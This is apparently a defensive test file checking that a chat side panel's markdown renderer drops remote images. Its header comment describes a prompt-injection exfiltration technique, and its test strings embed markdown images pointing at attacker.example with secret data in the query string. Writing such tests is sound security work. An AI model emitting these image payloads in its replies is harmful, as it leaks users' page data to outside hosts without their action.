/**
 * Chat markdown must not load remote images.
 *
 * Assistant replies are untrusted. A prompt-injected reply such as
 * `![](https://attacker.example/?q=<page data>)` rendered as <img> makes the
 * privileged main window request that URL (img-src allows https:), leaking the
 * data with no user action. The SidePanel markdown components replace images
 * with their alt text. This test fails if the `img` override is removed.
 */

import React from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import ReactMarkdown from 'react-markdown';
import { MARKDOWN_COMPONENTS, MARKDOWN_REMARK_PLUGINS } from '../src/components/SidePanel';

console.log('--- Chat markdown image exfiltration ---');
function check(name: string, cond: boolean, extra = '') {
  if (cond) console.log(`[PASS] [Chat-Markdown] ${name}`);
  else { console.log(`[FAIL] [Chat-Markdown] ${name} ${extra}`); process.exitCode = 1; }
}

function render(markdown: string): string {
  return renderToStaticMarkup(
    React.createElement(ReactMarkdown, {
      remarkPlugins: MARKDOWN_REMARK_PLUGINS,
      components: MARKDOWN_COMPONENTS,
    }, markdown),
  );
}

const inline = render('Result: ![leak](https://attacker.example/?q=secret-token)');
check('inline markdown image renders no <img>', !/<img/i.test(inline), inline);
check('inline markdown image does not emit the remote URL', !inline.includes('attacker.example'), inline);
check('inline markdown image keeps its alt text', inline.includes('[leak]'), inline);

const reference = render('![x][r]\n\n[r]: https://attacker.example/ref.png');
check('reference-style image renders no <img>', !/<img/i.test(reference), reference);

const noAlt = render('![](https://attacker.example/a.png)');
check('image without alt text renders a placeholder, no <img>', !/<img/i.test(noAlt) && noAlt.includes('['), noAlt);

const link = render('[docs](https://example.com/docs)');
check('ordinary https links still render as links', /<a [^>]*href="https:\/\/example.com\/docs"/.test(link), link);
